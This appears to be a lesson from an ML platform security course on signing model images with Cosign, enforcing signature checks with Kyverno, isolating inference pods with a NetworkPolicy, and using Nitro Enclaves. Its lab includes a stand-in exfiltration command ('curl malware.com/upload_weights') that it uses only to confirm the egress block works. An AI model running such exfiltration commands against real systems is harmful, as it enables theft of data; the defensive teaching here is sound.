# Day 160: The Vault: Secure Deployment Ecosystems
### Phase 6: AI/ML Platform Engineering with GPU Programming | Week 23: Security & Governance

---

> **🎯 Focus Area:** You scanned the code (Day 155), secured the RBAC (Day 156), and rotated the secrets (Day 157). Now you must deploy the model into a hostile environment where even the Cloud Provider cannot see your data.

---

## 🎯 Learning Objectives
*By the end of this day, the learner will be able to:*
1.  **Sign** Model Artifacts (ONNX/Docker) using **Sigstore/Cosign** to prevent tampering.
2.  **Enforce** Image Policy Webhooks to block unsigned models from running.
3.  **Deploy** into a Trusted Execution Environment (TEE) / Enclave (AWS Nitro).
4.  **Isolate** Inference Workloads using Kubernetes **NetworkPolicies**.

---

## 📚 Prerequisites & Preparation

### Hardware Requirements
- Local Machine.

### Software Environment
- `cosign`, `kubectl`.

---

## 📖 Theoretical Foundation

### 1. Supply Chain of Custody
If you pull `resnet:v1`, how do you know hackers didn't replace it with `resnet:backdoor` on the Docker Registry?
**Signing:** You sign the hash of the image with your private key. The cluster validates the signature with your public key.

### 2. Confidential Computing (Enclaves)
Standard Encryption:
*   At Rest (Disk): Encrypted.
*   In Transit (Network): Encrypted (TLS).
*   In Use (RAM): **Plaintext**. (Admin with root access can `dump_ram`).
**TEE (Enclave):** Encrypts RAM. Even the Cloud Provider (AWS/Google) cannot read the memory.

---

## 💻 Implementation

### 👨‍💻 Infrastructure: Signing the Model (Cosign)

Prevent tampering.

```bash
# 1. Generate Keys
cosign generate-key-pair
# Creates cosign.key (private) and cosign.pub (public)

# 2. Build and Push Image
docker build -t my-model:v1 .
docker push my-model:v1

# 3. Sign the Image
# This pushes a signature attachment to the registry
cosign sign --key cosign.key my-model:v1
```

### 👨‍💻 Infrastructure: Verifying Admission Controller (Kyverno)

Block unsigned images.

#### 📁 `manifests/policy-require-sign.yaml`
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: check-image-signature
spec:
  validationFailureAction: enforce
  rules:
    - name: check-signature
      match:
        any:
        - resources:
            kinds:
              - Pod
      verifyImages:
      - image: "docker.io/myorg/*"
        key: |-
          -----BEGIN PUBLIC KEY-----
          ... (Content of cosign.pub) ...
          -----END PUBLIC KEY-----
```
If an attacker pushes a modify image, the signature validation fails, and the Pod is rejected.

### 👨‍💻 Infrastructure: Network Policy (Calico/Cilium)

Defense in Depth. The Inference Pod should talk to:
1.  Frontend (Ingress).
2.  Metrics Server.
3.  **NOT** the Internet (to prevent exfiltrating training data).
4.  **NOT** the Database (Use Sidecar or API).

#### 📁 `manifests/net-policy.yaml`
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: isolate-inference
  namespace: prod
spec:
  podSelector:
    matchLabels:
      app: inference-service
  policyTypes:
  - Ingress
  - Egress
  
  # Allow Incoming from Gateway
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: api-gateway
    ports:
    - port: 8080
    
  # Allow Outgoing to Monitoring Only
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: monitoring
    ports:
    - port: 9090 # Prometheus
  
  # Implicitly DENY all other traffic (AWS S3, Internet, etc.)
  # Note: If model needs S3, detailed egress rule required.
```

---

## 🔬 Lab Exercise: "The Firewall"

### Task
Verify Data Exfiltration Block.
1.  Apply the NetworkPolicy.
2.  Exec into the Inference Pod: `kubectl exec -it inference-pod -- bash`.
3.  Try to curl Google: `curl google.com`.
4.  **Result:** Timeout. (Blocked).
5.  Try to curl Hacker Site: `curl malware.com/upload_weights`.
6.  **Result:** Timeout. (Blocked).
7.  **Insight:** Even if the attacker achieves RCE (Remote Code Execution) via pickle, they cannot steal the data because the network blocks the upload.

---

## 📖 Advanced Theory: AWS Nitro Enclaves
How to run Python in an Enclave.
1.  Build Docker Image.
2.  Convert to EIF (Enclave Image Format).
3.  Boot EC2 Instance.
4.  `nitro-cli run-enclave --cpu-count 2 --memory 4096 --eif-path my_model.eif`.
5.  The Enclave has NO persistent storage, NO interactive access (SSH), and only local socket communication with the Parent EC2.

---

## 📝 Daily Summary

### Key Takeaways
1.  **Zero Trust:** Assume the network is hostile. Assume the registry is compromised. Verify everything.
2.  **Image Scanning:** Use `trivy image my-model:v1` in CI. Block build if `CRITICAL` vulnerability found (e.g., old OpenSSL).
3.  **Bill of Materials (SBOM):** Generate an SBOM (`syft my-model:v1`). When the next "Log4j" happens, you can instantly search "Which of my 500 models contains Log4j?"

### API Summary
```bash
cosign sign --key k image
cosign verify --key k image
```

---

**Day 160 Complete** ✅

*Next: Day 161 - Week 23 Review & Project - The DevSecOps Pipeline.*
